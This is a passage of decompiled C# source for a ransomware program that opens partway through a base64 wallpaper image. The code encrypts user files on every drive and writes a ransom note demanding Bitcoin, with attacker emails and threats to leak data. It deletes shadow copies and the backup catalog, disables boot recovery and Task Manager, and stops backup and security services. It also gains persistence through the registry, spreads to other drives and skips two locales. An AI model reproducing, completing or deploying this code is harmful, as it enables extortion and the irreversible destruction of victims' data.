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IIABAABAAAMAAIAABgAAAAEMAAAAAhgAAAAEMAAAAAhgAAAABDAAAAAIYAAAABDAAAAAIIABAABAAAMAAIAABgAAAAEMAAAAAhgAAAAEMAAAAAIYAAAABDAAAAAIYAAAABDAAAAAIIABAABAAAMAAIAABgAAAAEMAAAAAhgAAAABDAAAAAIYAAAABDAAAAAIYAAAABDAAAAAIIABAABAAAMAAIAABgAAAAEMAACAAAYAAAABDAAAAAIYAAAABDAAAAAIYAAAABDAAAAAIIABAABAAAMAAIAABgAAQAADAACAAAYAAAABDAAAAAIYAAAABDAAAAAIYAAAABDAAAAAIIABAABAAAMAACCAAQAAQAADAACAAAYAAAABDAAAAAIYAAAABDAAAAAIYAAAABDAAAAAIIABAAAQwAAAACCAAQAAQAADAACAAAYAAAABDAAAAAIYAAAABDAAAAAIYAAAABDAAAAACGAAAAAQwAAAACCAAQAAQAADAACAAAYAAAABDAAAAAIYAAAABDAAAAAIYAAAAAQwAAAACGAAAAAQwAAAACCAAQAAQAADAACAAAYAAAABDAAAAAIYAAAAAQwAAAACGAAAAAQwAAAACGAAAAAQwAAAACCAAQAAQAADAACAAAYAAAABDAAAgAAGAAAAAQwAAAACGAAAAAQwAAAACGAAAAAQwAAAACCAAQAAQAADAACAAAYAAEAAAwAAgAAGAAAAAQwAAAACGAAAAAQwAAAACGAAAAAQwAAAACCAAQAAQAADAAAggAEAAEAAAwAAgAAGAAAAAQwAAAACGAAAAAQwAAAACGAAAAAQwAAAACCAAQAAEMAAAAAggAEAAEAAAwAAgAAGAAAAAQwAAAACGAAAAAQwAAAACGAAAAAQwAAAAAhgAAAAEMAAAAAggAEAAEAAAwAAgAAGAAAAAQwAAAACGAAAAAQwAAAACGAAAAAEMAAAAAhgAAAAEMAAAAAggAEAAEAAAwAAgAAGAAAAAQwAAAACGAAAAAQwAAAAAhgAAAAEMAAAAAhgAAAAEMAAAAAggAEAAEAAAwAAgAAGAAAAAQwAAAACGAAAAAEMAAAAAhgAAAAEMAAAAAhgAAAAEMAAAAAggAEAAEAAAwAAgAAGAAAAAQwAAIAABgAAAAEMAAAAAhgAAAAEMAAAAAhgAAAAEMAAAAAggAEAAOCp/f8BZ5hRK/89yIQAAAAASUVORK5CYII=";

	public static string appMutexStartup = "1qrx0frdqdur0lllc6ezm";

	private static string droppedMessageTextbox = "read_it.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	private static bool disableTaskManager = true;

	private static bool checkStopBackupServices = true;

	public static string appMutexStartup2 = "19DpJAWr6NCVT2";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static List<string> messages = new List<string>
	{
		"Don't worry, you can return all your files!", "", "All your files like documents, photos, databases and other important are encrypted", "", "What guarantees do we give to you?", "", "You can send 3 of your encrypted files and we decrypt it for free.", "", "You must follow these steps To decrypt your files :   ", "1) Write on our e-mail :iuumua@keemail.me ( In case of no answer in 24 hours check your spam folder",
		"or write us to this e-mail: sooua@tuta.io)", "", "2) Obtain Bitcoin (You have to pay for decryption in Bitcoins. ", "After payment we will send you the tool that will decrypt all your files.)", "", "3)Our Bitcoin address:3F6yd1c8tJji6ZJWAudyZWhMZMJLKwehCS", "", "4)The unique identifier of your device：MkSZVJQeAnTWTppMgeJM9hoZSpSvun2BS6okB4Q2Gfp4dZU9eE9TUjBNCGK2eoQk", "", "5)Do not presume to find some data recovery experts to decrypt, we do the ransomware virus only we can decrypt",
		"", "6）If you choose not to pay the ransom, we will not only release all relevant data from your server, but we will always carry out more powerful cyber attacks against your company and organization", "", "Let's happily solve this encryption problem!!!"
	};

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		if (forbiddenCountry())
		{
			MessageBox.Show("Forbidden Country");
			return;
		}
		if (RegistryValue())
		{
			new Thread((ThreadStart)delegate
			{
				Run();
			}).Start();
		}
		if (isOver())
		{
			return;
		}
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			registryStartup();
		}
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
			if (disableTaskManager)
			{
				DisableTaskManager();
			}
			if (checkStopBackupServices)
			{
				stopBackupServices();
			}
		}
		lookForDirectories();
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static bool forbiddenCountry()
	{
		string[] array = new string[2] { "az-Latn-AZ", "tr-TR" };
		string[] array2 = array;
		foreach (string text in array2)
		{
			try
			{
				string name = InputLanguage.CurrentInputLanguage.Culture.Name;
				if (name == text)
				{
					return true;
				}
			}
			catch
			{
			}
		}
		return false;
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool RegistryValue()
	{
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\" + appMutexRun2);
			object value = registryKey.GetValue(appMutexRun2);
			registryKey.Close();
			if (value.ToString().Length > 0)
			{
				return false;
			}
			return true;
		}
		catch
		{
			return true;
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool checkCrypted = true;
			Parallel.For(0, files.Length, delegate(int i)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (Array.Exists(validExtensions, (string E) => E == extension.ToLower()) && fileName != droppedMessageTextbox)
					{
						FileInfo fileInfo = new FileInfo(files[i]);
						try
						{
							fileInfo.Attributes = FileAttributes.Normal;
						}
						catch
						{
						}
						string text = CreatePassword(40);
						if (fileInfo.Length < 2368709120u)
						{
							if (checkDirContains(files[i]))
							{
								string keyRSA = RSA_Encrypt(text, rsaKey());
								AES_Encrypt(files[i], text, keyRSA);
							}
						}
						else
						{
							AES_Encrypt_Large(files[i], text, fileInfo.Length);
						}
						if (checkCrypted)
						{
							checkCrypted = false;
							string path = location + "/" + droppedMessageTextbox;
							string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory);
							if (!File.Exists(path) && location != folderPath)
							{
								File.WriteAllLines(path, messages);
							}
						}
					}
				}
				catch (Exception)
				{
				}
			});
			string[] childDirectories = Directory.GetDirectories(location);
			Parallel.For(0, childDirectories.Length, delegate(int i)
			{
				try
				{
					new DirectoryInfo(childDirectories[i]).Attributes &= ~FileAttributes.Normal;
				}
				catch
				{
				}
				encryptDirectory(childDirectories[i]);
			});
		}
		catch (Exception)
		{
		}
	}

	private static bool checkDirContains(string directory)
	{
		directory = directory.ToLower();
		string[] array = new string[16]
		{
			"appdata\\local", "appdata\\locallow", "users\\all users", "\\ProgramData", "boot.ini", "bootfont.bin", "boot.ini", "iconcache.db", "ntuser.dat", "ntuser.dat.log",
			"ntuser.ini", "thumbs.db", "autorun.inf", "bootsect.bak", "bootmgfw.efi", "desktop.ini"
		};
		string[] array2 = array;
		foreach (string value in array2)
		{
			if (directory.Contains(value))
			{
				return false;
			}
		}
		return true;
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>3ioukEI/N38iwB3zjvGc5YfBvE5ffnDezF5jikAkYrT05T74GInZGlPKcYj9Cd7PUURbcF4fcvWrgou0AHhWs8D5aFKp7TSbrH1un4qkguAs49e6OevrBXRR/nYAfoHoZhLdlFqBXNprE672yeZETgo/DlrkRZO20tt10SAEAmUnqCEvO2oNITv9tBy/KbZtojMTQ2Zv8offKoqBBQJ4oTHy6/lC/MvHVp5LqXVeAK3Zq0Q3bAwm8XceKtwmTq8XKW733Mogc6BUOairEdyqxs5Dppo5pv8MHWX3nC3XZvgPqXwMh4qMJwy7YFyXp5C5w4oMPFnGOfXHP3L8xGit5Q==</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	private static void AES_Encrypt(string inputFile, string password, string keyRSA)
	{
		string path = inputFile + "." + RandomStringForExtension(4);
		byte[] array = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		FileStream fileStream = new FileStream(path, FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 128;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 1);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
		fileStream2.CopyTo(cryptoStream);
		fileStream2.Flush();
		fileStream2.Close();
		cryptoStream.Flush();
		cryptoStream.Close();
		fileStream.Close();
		using (FileStream stream = new FileStream(path, FileMode.Append, FileAccess.Write))
		{
			using StreamWriter streamWriter = new StreamWriter(stream);
			streamWriter.Write(keyRSA);
			streamWriter.Flush();
			streamWriter.Close();
		}
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	private static void AES_Encrypt_Large(string inputFile, string password, long lenghtBytes)
	{
		GenerateRandomSalt();
		using FileStream fileStream = new FileStream(inputFile + "." + RandomStringForExtension(4), FileMode.Create, FileAccess.Write, FileShare.None);
		fileStream.SetLength(lenghtBytes);
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	public static byte[] GenerateRandomSalt()
	{
		byte[] array = new byte[32];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		for (int i = 0; i < 10; i++)
		{
			rNGCryptoServiceProvider.GetBytes(array);
		}
		return array;
	}

	public static string RSA_Encrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			string pathRoot = Path.GetPathRoot(Environment.SystemDirectory);
			if (driveInfo.ToString() == pathRoot)
			{
				string[] array = new string[12]
				{
					"Program Files", "Program Files (x86)", "Windows", "$Recycle.Bin", "MSOCache", "Documents and Settings", "Intel", "PerfLogs", "Windows.old", "AMD",
					"NVIDIA", "ProgramData"
				};
				string[] directories = Directory.GetDirectories(pathRoot);
				for (int j = 0; j < directories.Length; j++)
				{
					DirectoryInfo directoryInfo = new DirectoryInfo(directories[j]);
					string dirName = directoryInfo.Name;
					if (!Array.Exists(array, (string E) => E == dirName))
					{
						encryptDirectory(directories[j]);
					}
				}
			}
			else
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		byte[] bytes = File.ReadAllBytes(location);
		if (!File.Exists(text2))
		{
			File.WriteAllBytes(text2, bytes);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.WriteAllBytes(text2, bytes);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		byte[] bytes = File.ReadAllBytes(location);
		if (!File.Exists(text2))
		{
			File.WriteAllBytes(text2, bytes);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.WriteAllBytes(text2, bytes);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			if (!File.Exists(text))
			{
				File.WriteAllLines(text, messages);
			}
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static bool isOver()
	{
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + processName;
		string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		if (location != text)
		{
			try
			{
				File.Delete(path);
			}
			catch
			{
			}
		}
		if (File.Exists(path) && location == text)
		{
			return true;
		}
		return false;
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("UpdateTask", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != Path.GetPathRoot(Environment.SystemDirectory) && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void DisableTaskManager()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableTaskMgr", "1");
			registryKey.Close();
		}
		catch
		{
		}
	}

	private static void stopBackupServices()
	{
		//IL_018a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0190: Expected O, but got Unknown
		string[] array = new string[42]
		{
			"BackupExecAgentBrowser", "BackupExecDiveciMediaService", "BackupExecJobEngine", "BackupExecManagementService", "vss", "sql", "svc$", "memtas", "sophos", "veeam",
			"backup", "GxVss", "GxBlr", "GxFWD", "GxCVD", "GxCIMgr", "DefWatch", "ccEvtMgr", "SavRoam", "RTVscan",
			"QBFCService", "Intuit.QuickBooks.FCS", "YooBackup", "YooIT", "zhudongfangyu", "sophos", "stc_raw_agent", "VSNAPVSS", "QBCFMonitorService", "VeeamTransportSvc",
			"VeeamDeploymentService", "VeeamNFSSvc", "veeam", "PDVFSService", "BackupExecVSSProvider", "BackupExecAgentAccelerator", "BackupExecRPCService", "AcrSch2Svc", "AcronisAgent", "CASAD2DWebSvc",
			"CAARCUpdateSvc", "TeamViewer"
		};
		string[] array2 = array;
		foreach (string text in array2)
		{
			try
			{
				ServiceController val = new ServiceController(text);
				val.Stop();
			}
			catch
			{
			}
		}
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
